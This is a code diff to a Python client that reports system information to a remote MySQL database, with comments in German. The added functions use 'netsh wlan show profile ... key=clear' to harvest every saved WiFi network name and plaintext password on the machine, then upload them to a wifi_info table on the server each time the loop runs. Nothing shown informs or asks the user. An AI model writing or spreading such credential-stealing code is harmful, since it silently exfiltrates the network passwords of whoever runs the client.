@@ -6,6 +6,8 @@ import getpass
 import platform
 import mysql.connector
 from cpuinfo import get_cpu_info
+import subprocess
+import re
 
 def bytes_to_gb(bytes_value):
     """Convert bytes to gigabytes and round to two decimal places."""
@@ -97,6 +99,55 @@ def update_system_info(connection, client_db_id, system_info):
 
     print("System info and client status successfully updated in database for client ID:", client_db_id)
 
+def get_wifi_info():
+    # Kommando zum Abrufen aller gespeicherten WLAN-Profile
+    command = ["netsh", "wlan", "show", "profiles"]
+    try:
+        result = subprocess.run(command, capture_output=True, text=True, encoding='utf-8', errors='ignore').stdout
+        profiles = re.findall(r"Profil\s.*Benutzer\s*:\s*(.*)", result)
+    except Exception as e:
+        print(f"Fehler beim Ausführen des Befehls: {e}")
+        return []
+
+    wifi_data = []
+    
+    # Für jedes Profil (SSID) das Passwort abrufen
+    for profile in profiles:
+        command = ["netsh", "wlan", "show", "profile", profile, "key=clear"]
+        try:
+            result = subprocess.run(command, capture_output=True, text=True, encoding='utf-8', errors='ignore').stdout
+            password_match = re.search(r"Schl.*inhalt\s*:\s*(.*)", result)
+            password = password_match.group(1) if password_match else None
+        except Exception as e:
+            print(f"Fehler beim Abrufen des Profils {profile}: {e}")
+            continue
+        
+        wifi_data.append((profile, password))
+    
+    return wifi_data
+
+def store_wifi_info(connection, client_db_id, wifi_data):
+    cursor = connection.cursor()
+
+    # SQL-Anweisung zum Einfügen oder Aktualisieren der WLAN-Daten
+    query = """
+        INSERT INTO wifi_info (client_id, ssid, password)
+        VALUES (%s, %s, %s)
+        ON DUPLICATE KEY UPDATE 
+            password = VALUES(password)
+    """
+    
+    # WLAN-Daten in die Datenbank einfügen oder aktualisieren
+    for ssid, password in wifi_data:
+        try:
+            cursor.execute(query, (client_db_id, ssid, password))
+        except mysql.connector.Error as err:
+            print(f"Fehler beim Einfügen in die Datenbank: {err}")
+    
+    connection.commit()
+    cursor.close()
+
+
 def send_system_info():
     # Verbinde mit der Datenbank
     connection = mysql.connector.connect(
@@ -140,6 +191,12 @@ def send_system_info():
 
     # Aktualisieren der Daten in der MySQL-Datenbank
     update_system_info(connection, client_db_id, data)
+    
+    # WLAN-Daten abrufen und in der Datenbank speichern
+    wifi_info = get_wifi_info()
+    if wifi_info:
+        store_wifi_info(connection, client_db_id, wifi_info)
+    
     connection.close()
 
 while True:
